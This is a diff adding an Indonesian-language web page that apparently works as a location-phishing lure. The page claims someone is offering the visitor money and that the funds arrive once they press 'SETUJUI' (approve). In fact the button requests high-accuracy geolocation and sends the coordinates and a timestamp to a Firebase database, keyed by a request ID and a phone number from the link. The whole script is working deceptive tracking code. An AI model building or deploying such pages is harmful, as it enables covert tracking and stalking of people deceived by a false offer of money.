@@ -1,0 +1,125 @@
+<!-- minta_izin.html -->
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>M.U.R - Izin Lokasi</title>
+<style>
+*{box-sizing:border-box}
+body{margin:0;background:#088;color:#fff;font-family:Arial;min-height:100vh;display:flex;align-items:center;justify-content:center}
+.box{width:92%;max-width:430px;background:#151515;padding:25px;border-radius:20px;text-align:center}
+h1{color:teal}
+.info{background:#241313;padding:15px;border-radius:12px;line-height:1.5}
+button{width:100%;padding:15px;margin-top:12px;border:0;border-radius:10px;font-weight:bold}
+.allow{background: lightblue;color:teal}
+.deny{background:maroon;color:#fff}
+#status{margin-top:18px;color:#aaa}
+</style>
+</head>
+<body>
+<div class="box">
+<h1>M.U.R</h1>
+<h2>Penawaran Berbagi dana</h2>
+
+<p>Seseorang menawarkan dana untuk Anda harap diterima.</p>
+
+<div class="info">
+dana hanya dibagikan setelah Anda menekan
+<b>Setujui</b>.
+</div>
+
+<button class="allow" onclick="setujui()"> SETUJUI</button>
+<button class="deny" onclick="tolak()"> TOLAK</button>
+
+<div id="status"></div>
+</div>
+
+<script>
+const FIREBASE_URL="https://mur-studio-default-rtdb.asia-southeast1.firebasedatabase.app/";
+const params=new URLSearchParams(location.search);
+const requestId=params.get("request");
+const nomor=params.get("nomor");
+const statusBox=document.getElementById("status");
+
+function status(t){
+ statusBox.textContent=t;
+}
+
+async function update(data){
+ const r=await fetch(
+   FIREBASE_URL+"permintaan/"+encodeURIComponent(requestId)+".json",
+   {
+     method:"PATCH",
+     headers:{"Content-Type":"application/json"},
+     body:JSON.stringify(data)
+   }
+ );
+ if(!r.ok) throw new Error("Firebase "+r.status);
+}
+
+function setujui(){
+
+ if(!requestId||!nomor){
+   status("Link permintaan tidak valid.");
+   return;
+ }
+
+ if(!navigator.geolocation){
+   status("Perangkat tidak mendukung lokasi.");
+   return;
+ }
+
+ status("Meminta izin lokasi...");
+
+ navigator.geolocation.getCurrentPosition(
+ async p=>{
+   try{
+     status("Mengirim lokasi...");
+
+     await update({
+       status:"disetujui",
+       latitude:p.coords.latitude,
+       longitude:p.coords.longitude,
+       waktu:new Date().toISOString()
+     });
+
+     status("✓ Lokasi berhasil dibagikan.");
+   }catch(e){
+     status("Gagal mengirim lokasi: "+e.message);
+   }
+ },
+ e=>{
+   if(e.code===1) status("Izin lokasi ditolak.");
+   else if(e.code===2) status("Lokasi tidak tersedia.");
+   else if(e.code===3) status("Waktu mendapatkan lokasi habis.");
+   else status("Gagal mendapatkan lokasi.");
+ },
+ {
+   enableHighAccuracy:true,
+   timeout:20000,
+   maximumAge:0
+ }
+ );
+}
+
+async function tolak(){
+
+ if(!requestId){
+   status("Link permintaan tidak valid.");
+   return;
+ }
+
+ try{
+   await update({
+     status:"ditolak",
+     waktu:new Date().toISOString()
+   });
+   status("Permintaan ditolak.");
+ }catch(e){
+   status("Gagal mengirim jawaban: "+e.message);
+ }
+}
+</script>
+</body>
+</html>
